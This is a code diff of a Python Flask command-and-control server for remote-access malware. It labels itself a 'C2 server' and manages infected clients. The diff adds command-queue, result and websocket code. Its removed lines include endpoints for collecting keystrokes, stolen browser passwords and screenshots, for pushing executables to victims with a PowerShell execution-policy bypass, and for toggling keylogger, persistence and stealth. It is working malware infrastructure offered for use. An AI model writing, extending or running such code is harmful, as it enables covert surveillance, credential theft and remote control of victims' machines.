@@ -26,7 +26,7 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 CORS(app, origins="*")
-socketio = SocketIO(app, cors_allowed_origins="*")
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
 # Configuration
 DATABASE = 'bigfish.db'
@@ -43,8 +43,16 @@ for folder in [DOWNLOAD_FOLDER, UPLOAD_FOLDER, EXECUTABLES_FOLDER,
                SCREENSHOTS_FOLDER, KEYLOGS_FOLDER, PASSWORDS_FOLDER]:
     os.makedirs(folder, exist_ok=True)
 
-# Encryption
-ENCRYPTION_KEY = Fernet.generate_key()
+# Load or generate encryption key
+KEY_FILE = 'encryption.key'
+if os.path.exists(KEY_FILE):
+    with open(KEY_FILE, 'rb') as f:
+        ENCRYPTION_KEY = f.read()
+else:
+    ENCRYPTION_KEY = Fernet.generate_key()
+    with open(KEY_FILE, 'wb') as f:
+        f.write(ENCRYPTION_KEY)
+
 cipher = Fernet(ENCRYPTION_KEY)
 
 def init_db():
@@ -217,7 +225,10 @@ def encrypt_data(data):
 
 def decrypt_data(encrypted_data):
     """Decrypt data"""
-    return cipher.decrypt(base64.b64decode(encrypted_data)).decode()
+    try:
+        return cipher.decrypt(base64.b64decode(encrypted_data)).decode()
+    except:
+        return encrypted_data
 
 def get_client_folder(client_id, hostname):
     """Get or create client-specific folder"""
@@ -236,6 +247,19 @@ def get_client_folder(client_id, hostname):
         os.makedirs(folder, exist_ok=True)
     
     return folders
+
+def format_size(size_bytes):
+    """Format file size"""
+    if size_bytes == 0:
+        return "0B"
+    
+    size_names = ["B", "KB", "MB", "GB", "TB"]
+    i = 0
+    while size_bytes >= 1024 and i < len(size_names) - 1:
+        size_bytes /= 1024
+        i += 1
+    
+    return f"{size_bytes:.2f} {size_names[i]}"
 
 # ==================== ROUTES ====================
 
@@ -257,10 +281,14 @@ def client_checkin():
     """Client checkin endpoint"""
     try:
         data = request.json
-        client_id = data.get('id')
         
+        if not data:
+            return jsonify({'error': 'No data'}), 400
+        
+        client_id = data.get('id')
         if not client_id:
-            return jsonify({'error': 'No client ID'}), 400
+            # Generate new client ID
+            client_id = str(uuid.uuid4())
         
         conn = get_db()
         c = conn.cursor()
@@ -300,12 +328,16 @@ def client_checkin():
                  online_hours, client_id))
         else:
             # Insert new client
-            c.execute("""INSERT INTO clients VALUES 
-                (?,?,?,?,?,?,?,?,?,?,?,'online',?,?,?,?,?,?,?,?,?,?,?)""",
+            c.execute("""INSERT INTO clients 
+                (id, hostname, username, os, os_version, arch, cpu, ram, gpu, ip, 
+                 last_seen, status, privileges, av_status, country, city, isp, 
+                 process_hidden, keylogger_active, persistence_set, created_at, 
+                 download_folder, online_hours) 
+                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                 (client_id, data.get('hostname'), data.get('username'),
                  data.get('os'), data.get('os_version'), data.get('arch'),
                  data.get('cpu'), data.get('ram'), data.get('gpu'),
-                 client_ip, current_time, data.get('privileges'),
+                 client_ip, current_time, 'online', data.get('privileges'),
                  data.get('av_status'), data.get('country'),
                  data.get('city'), data.get('isp'), 0, 0, 0,
                  current_time, client_folders['downloads'], 0))
@@ -318,6 +350,10 @@ def client_checkin():
                           (client_id, key, str(value), current_time))
         
         conn.commit()
+        
+        # Get updated client data
+        c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
+        client_data = dict(c.fetchone())
         conn.close()
         
         # Notify via WebSocket
@@ -325,15 +361,18 @@ def client_checkin():
             'client_id': client_id,
             'hostname': hostname,
             'status': 'online',
-            'timestamp': current_time
+            'timestamp': current_time,
+            'data': client_data
         })
         
         logger.info(f"[✓] Checkin: {hostname} ({client_ip})")
         
         return jsonify({
             'status': 'ok',
+            'client_id': client_id,
             'timestamp': current_time,
-            'server_time': datetime.now().isoformat()
+            'server_time': datetime.now().isoformat(),
+            'message': 'Checkin successful'
         })
         
     except Exception as e:
@@ -439,53 +478,105 @@ def get_all_clients():
         
     except Exception as e:
         logger.error(f"[✗] Get clients error: {e}")
-        return jsonify({'clients': []})
+        return jsonify({'clients': [], 'error': str(e)})
 
-@app.route('/api/client/<client_id>', methods=['GET'])
-def get_client_details(client_id):
-    """Get detailed information about a specific client"""
+@app.route('/api/commands/<client_id>', methods=['GET'])
+def get_pending_commands(client_id):
+    """Get pending commands for client"""
     try:
         conn = get_db()
         c = conn.cursor()
+        current_time = time.time()
         
-        # Get client info
-        c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
-        client = c.fetchone()
+        # Update last seen
+        c.execute("UPDATE clients SET last_seen = ? WHERE id = ?", 
+                 (current_time, client_id))
         
-        if not client:
-            conn.close()
-            return jsonify({'error': 'Client not found'}), 404
+        # Get pending commands
+        c.execute("""SELECT id, command, command_type, require_admin 
+                    FROM commands 
+                    WHERE client_id = ? AND status = 'pending'
+                    ORDER BY priority DESC, created_at ASC
+                    LIMIT 10""", (client_id,))
         
-        # Get recent commands
-        c.execute("""SELECT * FROM commands 
-                    WHERE client_id = ? 
-                    ORDER BY created_at DESC LIMIT 20""", (client_id,))
-        commands = [dict(row) for row in c.fetchall()]
+        commands = [{'id': row['id'], 'command': row['command'],
+                    'type': row['command_type'], 
+                    'require_admin': bool(row['require_admin'])} 
+                   for row in c.fetchall()]
         
-        # Get system info
-        c.execute("""SELECT info_key, info_value FROM system_info 
-                    WHERE client_id = ? AND info_type = 'system'
-                    ORDER BY timestamp DESC""", (client_id,))
-        system_info = {row['info_key']: row['info_value'] for row in c.fetchall()}
+        if commands:
+            # Mark as sent
+            cmd_ids = [cmd['id'] for cmd in commands]
+            placeholders = ','.join(['?'] * len(cmd_ids))
+            c.execute(f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})", cmd_ids)
         
-        # Get file statistics
-        c.execute("""SELECT filetype, COUNT(*) as count, 
-                    SUM(filesize) as total_size 
-                    FROM files WHERE client_id = ? 
-                    GROUP BY filetype""", (client_id,))
-        file_stats = [dict(row) for row in c.fetchall()]
+        conn.commit()
         
+        # Get updated client status
+        c.execute('SELECT status FROM clients WHERE id = ?', (client_id,))
+        status = c.fetchone()
         conn.close()
         
-        return jsonify({
-            'client': dict(client),
-            'commands': commands,
-            'system_info': system_info,
-            'file_stats': file_stats
+        socketio.emit('client_heartbeat', {
+            'client_id': client_id,
+            'timestamp': current_time,
+            'status': 'online' if status else 'offline'
         })
         
+        return jsonify({'commands': commands})
+        
     except Exception as e:
-        logger.error(f"[✗] Client details error: {e}")
+        logger.error(f"[✗] Get commands error: {e}")
+        return jsonify({'commands': []})
+
+@app.route('/api/command/result', methods=['POST'])
+def submit_command_result():
+    """Submit command execution result"""
+    try:
+        data = request.json
+        command_id = data.get('command_id')
+        output = data.get('output', '')
+        status = data.get('status', 'completed')
+        
+        if not command_id:
+            return jsonify({'error': 'Missing command ID'}), 400
+        
+        conn = get_db()
+        c = conn.cursor()
+        
+        # Get command info
+        c.execute("SELECT client_id, command FROM commands WHERE id = ?", (command_id,))
+        cmd_info = c.fetchone()
+        
+        if not cmd_info:
+            conn.close()
+            return jsonify({'error': 'Command not found'}), 404
+        
+        # Update command
+        c.execute("""UPDATE commands 
+                    SET status = ?, output = ?, executed_at = ?
+                    WHERE id = ?""",
+                 (status, output[:10000], time.time(), command_id))
+        
+        conn.commit()
+        conn.close()
+        
+        # Notify via WebSocket
+        socketio.emit('command_result', {
+            'command_id': command_id,
+            'client_id': cmd_info['client_id'],
+            'command': cmd_info['command'],
+            'output': output[:500] + '...' if len(output) > 500 else output,
+            'status': status,
+            'timestamp': time.time()
+        })
+        
+        logger.info(f"[✓] Command result: {command_id[:8]} - {status}")
+        
+        return jsonify({'success': True})
+        
+    except Exception as e:
+        logger.error(f"[✗] Submit result error: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/command', methods=['POST'])
@@ -523,6 +614,15 @@ def send_command():
         conn.commit()
         conn.close()
         
+        # Notify via WebSocket
+        socketio.emit('new_command', {
+            'command_id': cmd_id,
+            'client_id': client_id,
+            'command': command,
+            'type': command_type,
+            'timestamp': time.time()
+        })
+        
         logger.info(f"[✓] Command sent: {command_type} to {client_id[:8]}")
         
         return jsonify({
@@ -533,89 +633,6 @@ def send_command():
         
     except Exception as e:
         logger.error(f"[✗] Send command error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/commands/<client_id>', methods=['GET'])
-def get_pending_commands(client_id):
-    """Get pending commands for client"""
-    try:
-        conn = get_db()
-        c = conn.cursor()
-        current_time = time.time()
-        
-        # Update last seen
-        c.execute("UPDATE clients SET last_seen = ? WHERE id = ?", 
-                 (current_time, client_id))
-        
-        # Get pending commands
-        c.execute("""SELECT id, command, command_type, require_admin 
-                    FROM commands 
-                    WHERE client_id = ? AND status = 'pending'
-                    ORDER BY priority DESC, created_at ASC
-                    LIMIT 10""", (client_id,))
-        
-        commands = [{'id': row['id'], 'command': row['command'],
-                    'type': row['command_type'], 
-                    'require_admin': bool(row['require_admin'])} 
-                   for row in c.fetchall()]
-        
-        if commands:
-            # Mark as sent
-            cmd_ids = [cmd['id'] for cmd in commands]
-            placeholders = ','.join(['?'] * len(cmd_ids))
-            c.execute(f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})", cmd_ids)
-        
-        conn.commit()
-        conn.close()
-        
-        return jsonify({'commands': commands})
-        
-    except Exception as e:
-        logger.error(f"[✗] Get commands error: {e}")
-        return jsonify({'commands': []})
-
-@app.route('/api/command/result', methods=['POST'])
-def submit_command_result():
-    """Submit command execution result"""
-    try:
-        data = request.json
-        command_id = data.get('command_id')
-        output = data.get('output', '')
-        status = data.get('status', 'completed')
-        
-        if not command_id:
-            return jsonify({'error': 'Missing command ID'}), 400
-        
-        conn = get_db()
-        c = conn.cursor()
-        
-        c.execute("""UPDATE commands 
-                    SET status = ?, output = ?, executed_at = ?
-                    WHERE id = ?""",
-                 (status, output, time.time(), command_id))
-        
-        # Get client ID from command
-        c.execute("SELECT client_id FROM commands WHERE id = ?", (command_id,))
-        result = c.fetchone()
-        
-        conn.commit()
-        conn.close()
-        
-        if result:
-            # Notify via WebSocket
-            socketio.emit('command_result', {
-                'command_id': command_id,
-                'client_id': result['client_id'],
-                'status': status,
-                'timestamp': time.time()
-            })
-        
-        logger.info(f"[✓] Command result: {command_id[:8]} - {status}")
-        
-        return jsonify({'success': True})
-        
-    except Exception as e:
-        logger.error(f"[✗] Submit result error: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/upload', methods=['POST'])
@@ -692,6 +709,14 @@ def upload_file():
         
         logger.info(f"[✓] File uploaded: {file.filename} ({filesize} bytes) from {client['hostname']}")
         
+        socketio.emit('file_uploaded', {
+            'client_id': client_id,
+            'filename': file.filename,
+            'size': filesize,
+            'type': file_type,
+            'timestamp': time.time()
+        })
+        
         return jsonify({
             'success': True,
             'file_id': file_id,
@@ -704,677 +729,31 @@ def upload_file():
         logger.error(f"[✗] Upload error: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/files/<client_id>', methods=['GET'])
-def list_client_files(client_id):
-    """List files from a client"""
-    try:
-        conn = get_db()
-        c = conn.cursor()
-        
-        c.execute("""SELECT id, original_name, filetype, filesize, 
-                    uploaded_at, downloaded, hash_sha256
-                    FROM files 
-                    WHERE client_id = ?
-                    ORDER BY uploaded_at DESC""", (client_id,))
-        
-        files = []
-        for row in c.fetchall():
-            files.append({
-                'id': row['id'],
-                'filename': row['original_name'],
-                'type': row['filetype'],
-                'size': row['filesize'],
-                'size_str': format_size(row['filesize']),
-                'uploaded': datetime.fromtimestamp(row['uploaded_at']).strftime('%Y-%m-%d %H:%M'),
-                'downloaded': bool(row['downloaded']),
-                'hash': row['hash_sha256'][:16] + '...'
-            })
-        
-        conn.close()
-        return jsonify({'files': files})
-        
-    except Exception as e:
-        logger.error(f"[✗] List files error: {e}")
-        return jsonify({'files': []})
+# ==================== WEB SOCKET EVENTS ====================
 
-@app.route('/api/file/download/<file_id>', methods=['GET'])
-def download_file(file_id):
-    """Download a file"""
-    try:
-        conn = get_db()
-        c = conn.cursor()
-        
-        c.execute("SELECT filepath, original_name FROM files WHERE id = ?", (file_id,))
-        file_info = c.fetchone()
-        
-        if not file_info or not os.path.exists(file_info['filepath']):
-            conn.close()
-            return jsonify({'error': 'File not found'}), 404
-        
-        # Mark as downloaded
-        c.execute("UPDATE files SET downloaded = 1 WHERE id = ?", (file_id,))
-        conn.commit()
-        conn.close()
-        
-        return send_file(
-            file_info['filepath'],
-            as_attachment=True,
-            download_name=file_info['original_name']
-        )
-        
-    except Exception as e:
-        logger.error(f"[✗] Download error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/executables', methods=['GET', 'POST'])
-def manage_executables():
-    """Manage executables library"""
-    if request.method == 'GET':
-        # List executables
-        try:
-            conn = get_db()
-            c = conn.cursor()
-            
-            c.execute("""SELECT id, name, description, filename, platform, 
-                        require_admin, uploader, uploaded_at, downloads, size
-                        FROM executables 
-                        ORDER BY uploaded_at DESC""")
-            
-            executables = []
-            for row in c.fetchall():
-                executables.append({
-                    'id': row['id'],
-                    'name': row['name'],
-                    'description': row['description'],
-                    'filename': row['filename'],
-                    'platform': row['platform'],
-                    'require_admin': bool(row['require_admin']),
-                    'uploader': row['uploader'],
-                    'uploaded': datetime.fromtimestamp(row['uploaded_at']).strftime('%Y-%m-%d'),
-                    'downloads': row['downloads'],
-                    'size': format_size(row['size'])
-                })
-            
-            conn.close()
-            return jsonify({'executables': executables})
-            
-        except Exception as e:
-            logger.error(f"[✗] List executables error: {e}")
-            return jsonify({'executables': []})
-    
-    elif request.method == 'POST':
-        # Upload new executable
-        try:
-            if 'file' not in request.files:
-                return jsonify({'error': 'No file provided'}), 400
-            
-            file = request.files['file']
-            name = request.form.get('name', file.filename)
-            description = request.form.get('description', '')
-            platform = request.form.get('platform', 'windows')
-            require_admin = request.form.get('require_admin', 'false') == 'true'
-            uploader = request.form.get('uploader', 'admin')
-            
-            if file.filename == '':
-                return jsonify({'error': 'No filename'}), 400
-            
-            # Save file
-            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            safe_filename = f"{timestamp}_{file.filename}"
-            filepath = os.path.join(EXECUTABLES_FOLDER, safe_filename)
-            
-            file.save(filepath)
-            filesize = os.path.getsize(filepath)
-            
-            # Calculate hash
-            with open(filepath, 'rb') as f:
-                file_data = f.read()
-                hash_sha256 = hashlib.sha256(file_data).hexdigest()
-            
-            # Store in database
-            conn = get_db()
-            c = conn.cursor()
-            
-            exe_id = str(uuid.uuid4())
-            c.execute("""INSERT INTO executables 
-                        (id, name, description, filename, filepath, platform,
-                         require_admin, uploader, uploaded_at, hash_sha256, size)
-                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
-                     (exe_id, name, description, safe_filename, filepath,
-                      platform, 1 if require_admin else 0, uploader,
-                      time.time(), hash_sha256, filesize))
-            
-            conn.commit()
-            conn.close()
-            
-            logger.info(f"[✓] Executable uploaded: {name} ({filesize} bytes)")
-            
-            return jsonify({
-                'success': True,
-                'executable_id': exe_id,
-                'name': name,
-                'hash': hash_sha256
-            })
-            
-        except Exception as e:
-            logger.error(f"[✗] Upload executable error: {e}")
-            return jsonify({'error': str(e)}), 500
-
-@app.route('/api/executable/deploy', methods=['POST'])
-def deploy_executable():
-    """Deploy executable to client"""
-    try:
-        data = request.json
-        client_id = data.get('client_id')
-        executable_id = data.get('executable_id')
-        arguments = data.get('arguments', '')
-        run_as_admin = data.get('run_as_admin', False)
-        
-        if not client_id or not executable_id:
-            return jsonify({'error': 'Missing parameters'}), 400
-        
-        conn = get_db()
-        c = conn.cursor()
-        
-        # Get executable info
-        c.execute("SELECT * FROM executables WHERE id = ?", (executable_id,))
-        executable = c.fetchone()
-        
-        if not executable:
-            conn.close()
-            return jsonify({'error': 'Executable not found'}), 404
-        
-        # Get client info
-        c.execute("SELECT hostname FROM clients WHERE id = ?", (client_id,))
-        client = c.fetchone()
-        
-        if not client:
-            conn.close()
-            return jsonify({'error': 'Client not found'}), 404
-        
-        # Create deployment command
-        if executable['platform'] == 'windows':
-            if executable['filename'].endswith('.ps1'):
-                command = f"powershell -ExecutionPolicy Bypass -File {executable['filename']} {arguments}"
-            elif executable['filename'].endswith('.bat'):
-                command = f"cmd /c {executable['filename']} {arguments}"
-            else:
-                command = f"{executable['filename']} {arguments}"
-        else:
-            command = f"./{executable['filename']} {arguments}"
-        
-        # Add admin requirement if needed
-        require_admin = executable['require_admin'] or run_as_admin
-        
-        # Create command record
-        cmd_id = str(uuid.uuid4())
-        c.execute("""INSERT INTO commands 
-                    (id, client_id, command, command_type, status, 
-                     created_at, require_admin, priority)
-                    VALUES (?, ?, ?, 'deploy', 'pending', ?, ?, 1)""",
-                 (cmd_id, client_id, command, time.time(), 
-                  1 if require_admin else 0))
-        
-        # Increment download count
-        c.execute("UPDATE executables SET downloads = downloads + 1 WHERE id = ?", 
-                 (executable_id,))
-        
-        conn.commit()
-        conn.close()
-        
-        logger.info(f"[✓] Executable deployment queued: {executable['name']} to {client['hostname']}")
-        
-        return jsonify({
-            'success': True,
-            'command_id': cmd_id,
-            'message': 'Deployment queued'
-        })
-        
-    except Exception as e:
-        logger.error(f"[✗] Deploy executable error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/keylog', methods=['POST'])
-def upload_keylog():
-    """Upload keylog data"""
-    try:
-        data = request.json
-        client_id = data.get('client_id')
-        keystrokes = data.get('keystrokes')
-        window_title = data.get('window_title', 'Unknown')
-        process_name = data.get('process_name', 'Unknown')
-        
-        if not client_id or not keystrokes:
-            return jsonify({'error': 'Missing data'}), 400
-        
-        # Decrypt if needed
-        if data.get('encrypted', False):
-            try:
-                keystrokes = decrypt_data(keystrokes)
-            except:
-                pass
-        
-        conn = get_db()
-        c = conn.cursor()
-        
-        # Store in database
-        c.execute("""INSERT INTO keylogs 
-                    (client_id, keystrokes, window_title, timestamp, process_name)
-                    VALUES (?, ?, ?, ?, ?)""",
-                 (client_id, keystrokes, window_title, time.time(), process_name))
-        
-        # Update client last keylog time
-        c.execute("UPDATE clients SET last_seen = ? WHERE id = ?", 
-                 (time.time(), client_id))
-        
-        conn.commit()
-        conn.close()
-        
-        logger.info(f"[✓] Keylog received from {client_id[:8]}")
-        
-        return jsonify({'success': True})
-        
-    except Exception as e:
-        logger.error(f"[✗] Keylog upload error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/keylogs/<client_id>', methods=['GET'])
-def get_keylogs(client_id):
-    """Get keylogs for a client"""
-    try:
-        limit = request.args.get('limit', 50, type=int)
-        
-        conn = get_db()
-        c = conn.cursor()
-        
-        c.execute("""SELECT keystrokes, window_title, timestamp, process_name
-                    FROM keylogs 
-                    WHERE client_id = ?
-                    ORDER BY timestamp DESC
-                    LIMIT ?""", (client_id, limit))
-        
-        keylogs = []
-        for row in c.fetchall():
-            keylogs.append({
-                'keystrokes': row['keystrokes'],
-                'window': row['window_title'],
-                'process': row['process_name'],
-                'timestamp': row['timestamp'],
-                'time': datetime.fromtimestamp(row['timestamp']).strftime('%H:%M:%S')
-            })
-        
-        conn.close()
-        return jsonify({'keylogs': keylogs})
-        
-    except Exception as e:
-        logger.error(f"[✗] Get keylogs error: {e}")
-        return jsonify({'keylogs': []})
-
-@app.route('/api/passwords', methods=['POST'])
-def upload_passwords():
-    """Upload extracted passwords"""
-    try:
-        data = request.json
-        client_id = data.get('client_id')
-        passwords = data.get('passwords', [])
-        
-        if not client_id or not passwords:
-            return jsonify({'error': 'Missing data'}), 400
-        
-        conn = get_db()
-        c = conn.cursor()
-        
-        for pwd in passwords:
-            browser = pwd.get('browser', 'Unknown')
-            url = pwd.get('url', '')
-            username = pwd.get('username', '')
-            password = pwd.get('password', '')
-            
-            # Encrypt password
-            encrypted_password = encrypt_data(password) if password else ''
-            
-            pwd_id = str(uuid.uuid4())
-            c.execute("""INSERT INTO passwords 
-                        (id, client_id, browser, url, username, password, 
-                         encrypted_password, timestamp)
-                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
-                     (pwd_id, client_id, browser, url, username, 
-                      password, encrypted_password, time.time()))
-        
-        conn.commit()
-        conn.close()
-        
-        logger.info(f"[✓] Passwords uploaded from {client_id[:8]}: {len(passwords)}")
-        
-        return jsonify({'success': True})
-        
-    except Exception as e:
-        logger.error(f"[✗] Passwords upload error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/passwords/<client_id>', methods=['GET'])
-def get_passwords(client_id):
-    """Get passwords for a client"""
-    try:
-        conn = get_db()
-        c = conn.cursor()
-        
-        c.execute("""SELECT browser, url, username, password, timestamp
-                    FROM passwords 
-                    WHERE client_id = ?
-                    ORDER BY timestamp DESC""", (client_id,))
-        
-        passwords = []
-        for row in c.fetchall():
-            passwords.append({
-                'browser': row['browser'],
-                'url': row['url'],
-                'username': row['username'],
-                'password': row['password'],  # Already decrypted
-                'timestamp': row['timestamp'],
-                'time': datetime.fromtimestamp(row['timestamp']).strftime('%Y-%m-%d %H:%M')
-            })
-        
-        conn.close()
-        return jsonify({'passwords': passwords})
-        
-    except Exception as e:
-        logger.error(f"[✗] Get passwords error: {e}")
-        return jsonify({'passwords': []})
-
-@app.route('/api/screenshot', methods=['POST'])
-def upload_screenshot():
-    """Upload screenshot"""
-    try:
-        if 'file' not in request.files:
-            return jsonify({'error': 'No file provided'}), 400
-        
-        file = request.files['file']
-        client_id = request.form.get('client_id')
-        
-        if not client_id:
-            return jsonify({'error': 'No client ID'}), 400
-        
-        conn = get_db()
-        c = conn.cursor()
-        
-        # Get client folder
-        c.execute('SELECT hostname FROM clients WHERE id = ?', (client_id,))
-        client = c.fetchone()
-        
-        if not client:
-            conn.close()
-            return jsonify({'error': 'Client not found'}), 404
-        
-        # Save screenshot
-        client_folder = os.path.join(SCREENSHOTS_FOLDER, client['hostname'])
-        os.makedirs(client_folder, exist_ok=True)
-        
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f"screenshot_{timestamp}.png"
-        filepath = os.path.join(client_folder, filename)
-        
-        file.save(filepath)
-        filesize = os.path.getsize(filepath)
-        
-        # Get image dimensions (optional)
-        width = height = 0
-        try:
-            from PIL import Image
-            with Image.open(filepath) as img:
-                width, height = img.size
-        except:
-            pass
-        
-        # Store in database
-        screenshot_id = str(uuid.uuid4())
-        c.execute("""INSERT INTO screenshots 
-                    (id, client_id, timestamp, filepath, width, height, size)
-                    VALUES (?, ?, ?, ?, ?, ?, ?)""",
-                 (screenshot_id, client_id, time.time(), filepath, 
-                  width, height, filesize))
-        
-        conn.commit()
-        conn.close()
-        
-        logger.info(f"[✓] Screenshot uploaded from {client['hostname']}")
-        
-        return jsonify({
-            'success': True,
-            'screenshot_id': screenshot_id,
-            'filename': filename
-        })
-        
-    except Exception as e:
-        logger.error(f"[✗] Screenshot upload error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/screenshots/<client_id>', methods=['GET'])
-def get_screenshots(client_id):
-    """Get screenshots for a client"""
-    try:
-        conn = get_db()
-        c = conn.cursor()
-        
-        c.execute("""SELECT id, timestamp, filepath, width, height, size
-                    FROM screenshots 
-                    WHERE client_id = ?
-                    ORDER BY timestamp DESC
-                    LIMIT 20""", (client_id,))
-        
-        screenshots = []
-        for row in c.fetchall():
-            screenshots.append({
-                'id': row['id'],
-                'timestamp': row['timestamp'],
-                'time': datetime.fromtimestamp(row['timestamp']).strftime('%Y-%m-%d %H:%M'),
-                'filepath': row['filepath'],
-                'dimensions': f"{row['width']}x{row['height']}" if row['width'] else 'Unknown',
-                'size': format_size(row['size']),
-                'url': f"/api/screenshot/view/{row['id']}"
-            })
-        
-        conn.close()
-        return jsonify({'screenshots': screenshots})
-        
-    except Exception as e:
-        logger.error(f"[✗] Get screenshots error: {e}")
-        return jsonify({'screenshots': []})
-
-@app.route('/api/screenshot/view/<screenshot_id>', methods=['GET'])
-def view_screenshot(screenshot_id):
-    """View screenshot"""
-    try:
-        conn = get_db()
-        c = conn.cursor()
-        
-        c.execute('SELECT filepath FROM screenshots WHERE id = ?', (screenshot_id,))
-        screenshot = c.fetchone()
-        conn.close()
-        
-        if not screenshot or not os.path.exists(screenshot['filepath']):
-            return jsonify({'error': 'Screenshot not found'}), 404
-        
-        return send_file(screenshot['filepath'], mimetype='image/png')
-        
-    except Exception as e:
-        logger.error(f"[✗] View screenshot error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/stats', methods=['GET'])
-def get_system_stats():
-    """Get system statistics"""
-    try:
-        conn = get_db()
-        c = conn.cursor()
-        current_time = time.time()
-        
-        # Basic stats
-        c.execute('SELECT COUNT(*) FROM clients')
-        total_clients = c.fetchone()[0]
-        
-        c.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
-        online_now = c.fetchone()[0]
-        
-        c.execute('SELECT COUNT(*) FROM files')
-        total_files = c.fetchone()[0]
-        
-        c.execute('SELECT SUM(filesize) FROM files')
-        total_size = c.fetchone()[0] or 0
-        
-        c.execute('SELECT COUNT(*) FROM keylogs')
-        total_keylogs = c.fetchone()[0]
-        
-        c.execute('SELECT COUNT(*) FROM passwords')
-        total_passwords = c.fetchone()[0]
-        
-        c.execute('SELECT COUNT(*) FROM executables')
-        total_executables = c.fetchone()[0]
-        
-        # OS distribution
-        c.execute("""SELECT os, COUNT(*) as count FROM clients GROUP BY os""")
-        os_dist = {row['os']: row['count'] for row in c.fetchall()}
-        
-        # Recent activity
-        c.execute("""SELECT COUNT(*) FROM commands 
-                    WHERE created_at > ?""", (current_time - 3600,))
-        hourly_commands = c.fetchone()[0]
-        
-        conn.close()
-        
-        return jsonify({
-            'total_clients': total_clients,
-            'online_now': online_now,
-            'total_files': total_files,
-            'total_size': total_size,
-            'total_size_str': format_size(total_size),
-            'total_keylogs': total_keylogs,
-            'total_passwords': total_passwords,
-            'total_executables': total_executables,
-            'os_distribution': os_dist,
-            'hourly_commands': hourly_commands,
-            'server_time': datetime.now().isoformat(),
-            'folders': {
-                'downloads': DOWNLOAD_FOLDER,
-                'executables': EXECUTABLES_FOLDER,
-                'screenshots': SCREENSHOTS_FOLDER
-            }
-        })
-        
-    except Exception as e:
-        logger.error(f"[✗] Stats error: {e}")
-        return jsonify({'error': str(e)})
-
-@app.route('/api/client/control', methods=['POST'])
-def client_control():
-    """Control client settings (keylogger, stealth, etc.)"""
-    try:
-        data = request.json
-        client_id = data.get('client_id')
-        action = data.get('action')
-        value = data.get('value', True)
-        
-        if not client_id or not action:
-            return jsonify({'error': 'Missing parameters'}), 400
-        
-        conn = get_db()
-        c = conn.cursor()
-        
-        # Update client settings
-        if action == 'keylogger':
-            c.execute("UPDATE clients SET keylogger_active = ? WHERE id = ?", 
-                     (1 if value else 0, client_id))
-            command = f"keylogger {'start' if value else 'stop'}"
-            
-        elif action == 'persistence':
-            c.execute("UPDATE clients SET persistence_set = ? WHERE id = ?", 
-                     (1 if value else 0, client_id))
-            command = f"persistence {'enable' if value else 'disable'}"
-            
-        elif action == 'stealth':
-            c.execute("UPDATE clients SET process_hidden = ? WHERE id = ?", 
-                     (1 if value else 0, client_id))
-            command = f"stealth {'enable' if value else 'disable'}"
-            
-        elif action == 'screenshot':
-            command = "screenshot"
-            value = True
-            
-        elif action == 'extract_passwords':
-            command = "extract_passwords"
-            value = True
-            
-        else:
-            conn.close()
-            return jsonify({'error': 'Invalid action'}), 400
-        
-        # Send command to client
-        cmd_id = str(uuid.uuid4())
-        c.execute("""INSERT INTO commands 
-                    (id, client_id, command, command_type, status, created_at, priority)
-                    VALUES (?, ?, ?, 'control', 'pending', ?, 10)""",
-                 (cmd_id, client_id, command, time.time()))
-        
-        conn.commit()
-        conn.close()
-        
-        return jsonify({
-            'success': True,
-            'command_id': cmd_id,
-            'message': f'Control command sent: {action}'
-        })
-        
-    except Exception as e:
-        logger.error(f"[✗] Client control error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-def get_online_count():
-    """Get count of online clients"""
-    try:
-        conn = get_db()
-        c = conn.cursor()
-        current_time = time.time()
-        c.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
-        count = c.fetchone()[0]
-        conn.close()
-        return count
-    except:
-        return 0
-
-def format_size(size_bytes):
-    """Format file size"""
-    if size_bytes == 0:
-        return "0B"
-    
-    size_names = ["B", "KB", "MB", "GB", "TB"]
-    i = 0
-    while size_bytes >= 1024 and i < len(size_names) - 1:
-        size_bytes /= 1024
-        i += 1
-    
-    return f"{size_bytes:.2f} {size_names[i]}"
-
-# WebSocket events
 @socketio.on('connect')
 def handle_connect():
-    logger.info(f"[✓] Client connected: {request.sid}")
-    emit('connected', {'message': 'Connected to C2 server'})
+    logger.info(f"[✓] WebSocket client connected: {request.sid}")
+    emit('connected', {'message': 'Connected to C2 server', 'sid': request.sid})
 
 @socketio.on('disconnect')
 def handle_disconnect():
-    logger.info(f"[✓] Client disconnected: {request.sid}")
+    logger.info(f"[✓] WebSocket client disconnected: {request.sid}")
 
 @socketio.on('client_update')
 def handle_client_update(data):
     """Broadcast client updates to all connected consoles"""
-    emit('client_update', data, broadcast=True)
+    emit('client_update', data, broadcast=True, include_self=False)
 
-@socketio.on('command_update')
-def handle_command_update(data):
-    """Broadcast command updates"""
-    emit('command_update', data, broadcast=True)
+@socketio.on('subscribe_client')
+def handle_subscribe_client(data):
+    """Subscribe to client updates"""
+    client_id = data.get('client_id')
+    logger.info(f"[✓] Subscribed to client: {client_id}")
+    emit('subscribed', {'client_id': client_id})
 
-# Background tasks
+# ==================== BACKGROUND TASKS ====================
+
 def cleanup_old_data():
